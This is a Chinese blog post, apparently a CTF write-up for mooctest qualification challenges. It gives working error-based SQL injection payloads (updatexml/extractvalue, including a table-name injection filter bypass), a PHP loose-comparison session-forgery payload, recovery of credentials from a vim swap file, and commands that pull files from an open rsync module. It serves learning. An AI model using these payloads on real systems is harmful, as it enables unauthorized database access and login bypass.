---
title: mooctest-writeup
date: 2017-10-05 00:06:26
tags:
  - CTF
  - 信息安全
  - web安全
  - write-up
categories: 信息安全
---

做了些ctf的题目，想参加mooctest试试吧，就当锻炼锻炼。这个是平台上的资格测试的题目。

<!-- more -->

## babysql

> 报错都给你了，还不会注入？ 题目地址：<http://114.55.36.69:20680/index.php?table=news&id=3>

根据提示应该是报错注入，选择一个报错函数 直接上吧

```
?table=news&id=3 and (updatexml(1,concat(0x7e,(select user()),0x7e),1))
XPATH syntax error: '~errorerror@localhost~'

?table=news&id=3 and (updatexml(1,concat(0x7e,(select database()),0x7e),1))
XPATH syntax error: '~errorerror~'

table=news&id=3 and (updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='errorerror'),0x7e),1))
XPATH syntax error: '~error_flag,error_news~'

?table=news&id=3 and (updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.tables where table_schema='errorerror' and table_name='error_flag'),0x7e),1))
然后并没有爆出字段，而是显示了hacker，看来过滤了column_name
```



在群里问了一声，一个朋友给出了资料

- [sql注入tips【被雨牛和俊杰师傅打开的新世界大门](http://www.wupco.cn/?p=3764)
- [当表名可控的注入遇到了Describe时的几种情况](http://www.yulegeyu.com/2017/04/16/%E5%BD%93%E8%A1%A8%E5%90%8D%E5%8F%AF%E6%8E%A7%E7%9A%84%E6%B3%A8%E5%85%A5%E9%81%87%E5%88%B0%E4%BA%86Describe%E6%97%B6%E7%9A%84%E5%87%A0%E7%A7%8D%E6%83%85%E5%86%B5%E3%80%82/)

了解一番新姿势后，于是里面的payload都给出了

```
?table=news`%23` where 0=extractvalue(1,(select group_concat(0x3a,column_name) from information_schema.columns where table_name='error_flag'))%23`%26id=1&id=3
XPATH syntax error: ':flag_you_will_never_know'
```



详解请看上面的链接，解释的很清楚，学到了一波！
最后再根据字段查询一下，得到flag

```
?table=news&id=3 and (updatexml(1,concat(0x7e,(select `flag_you_will_never_know` from error_flag limit 0,1),0x7e),1))
```



## babylogin

> 很正常的登录逻辑，只是…

```php
<?php
include "config.php";

header("Content-Type:text/html;charset=utf8");
session_start();
if (!empty($_SESSION)&&$_SESSION["login"]==1) {
        header("Location: admin.php"); 
        exit();
    }

foreach (array('_GET','_POST','_COOKIE') as $key) {
    foreach ($$key as $key2 => $value) {
        $_GPC[$key2]=$value;
    }
}
//var_dump($_GPC);exit();
if ($_SERVER["REQUEST_METHOD"]=="GET"){
    echo include "outputtpl.php";
}else if($_SERVER["REQUEST_METHOD"]=="POST"){
    
    $userin=addslashes($_POST["name"]);
    $passin=addslashes($_POST["password"]);
    $session = json_decode(base64_decode($_GPC['__session']), true);
    if (is_array($session)){
        $user = find_user_by_uid($session['uid']);
        if(is_array($user) && $session['hash'] == $user['password']){
            $_SESSION["login"]=1;
            $_SESSION["userin"]=$userin;
            header("Location: admin.php");
            exit();
        }else{
            echo "用户名或密码错误";
        }
    }else{
        $sql = "select password from admin where username='$userin'";
        $row = mysql_fetch_array(mysql_query($sql));
        if($row){
            if($row[$passin]==md5($passin)){
                $_SESSION["login"]=1;
                $_SESSION["userin"]=$userin;
                header("Location: admin.php");
                exit();
            }else{
                echo "用户名或密码错误";
            }
        }else{
            echo "用户名或密码错误";
        }    
    }
}else {
    echo "GET or POST plz!";
}
```

思考一会儿之后，记起 `true == 'string'` 是为真，于是逆向构造下`__session`

```php
$__session = array('uid'=>'1','hash' =>true);
echo base64_encode(json_encode($__session));
```



提交payload，得到flag

```
name=admin&password=password&__session=eyJ1aWQiOiIxIiwiaGFzaCI6dHJ1ZX0=
```



## 编辑器的锅

> login as admin 题目地址：<http://114.55.36.69:20380/login.php>

猜测是vim编辑器吧，访问 `.login.php.swp` 下载到文件，然后cat查看后得到部分源码，格式没排版

```php
echo "GET or POST plz!";}else {    }        echo "用户名或密码错误";    }else{        }            echo "用户名或密码错误";        }else{            exit();            header("Location: admin.php");            $_SESSION["userin"]=$userin;            $_SESSION["login"]=1;        if($passin=="ca1buda0mima7ah4ha"){    if ($userin=="admin94wo"){    $passin=$_POST["password"];    $userin=$_POST["name"];    }else if($_SERVER["REQUEST_METHOD"]=="POST"){EOT;</body></html></div>    </div>                        </form>            </p>                            <p>            </p>                                <button type="submit" class="btn btn-l w-100 primary">登录</button>            <p class="submit">            </p>                <input id="password" name="password" class="text-l w-100" placeholder="密码" type="password">                <label for="password" class="sr-only">密码</label>            <p>            </p>                <input id="name" name="name" placeholder="用户名" class="text-l w-100" autofocus="" type="text">                <label for="name" class="sr-only">用户名</label>            <p>        <form action="" method="post" name="login" role="form" >        <h1>登录</h1>    <div class="typecho-login" ><div class="typecho-login-wrap">        <body class="body-100"></head><link rel="stylesheet" href="res/style.css"><link rel="stylesheet" href="res/grid.css">        <link rel="stylesheet" href="res/normalize.css">        <meta name="robots" content="noindex, nofollow">        <title>用户登录</title>        <meta name="viewport" content="width=device-width, initial-scale=1">        <meta name="renderer" content="webkit">        <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">        <meta charset="UTF-8"><meta http-equiv="content-type" content="text/html; charset=UTF-8"><html class="no-js"><head><!DOCTYPE html><<<EOT    echo if ($_SERVER["REQUEST_METHOD"]=="GET"){    }        exit();        header("Location: admin.php"); if (!empty($_SESSION)&&$_SESSION["login"]==1) {session_start();header("Content-Type:text/html;charset=utf8");<?php%
```



`username=admin94w&password=ca1buda0mima7ah4ha` 提交得flag

## 服务发现

> 虽然代码同步了，但你这个配置…有问题 题目地址：<http://118.178.18.181:20280/>

经狗哥提醒是rsync，于是

```
rsync 118.178.18.181::

source code
```



返回这个内容，但是中间有个空格，那就引号包裹

```
rsync 118.178.18.181::"source code"
drwxr-xr-x        4096 2017/06/14 13:01:20 .
-rw-r--r--          44 2017/06/14 13:01:20 flag.php
-rw-r--r--          26 2017/06/14 13:01:20 index.php

rsync 118.178.18.181::"source code/flag.php" /Users/isky/Desktop
```



[关于rsync](http://www.91ri.org/11093.html)

> rsync(remote synchronize)——Linux下实现远程同步功能的软件，能同步更新两处计算机的文件及目录。在同步文件时，可以保持源文件的权限、时间、软硬链接等附加信息。常被用于在内网进行源代码的分发及同步更新，因此使用人群多为开发人员；而开发人员安全意识薄弱、安全技能欠缺往往是导致rsync出现相关漏洞的根源。
> rsync默认配置文件为/etc/rsyncd.conf，常驻模式启动命令rsync –daemon，启动成功后默认监听于TCP端口873，可通过rsync-daemon及ssh两种方式进行认证。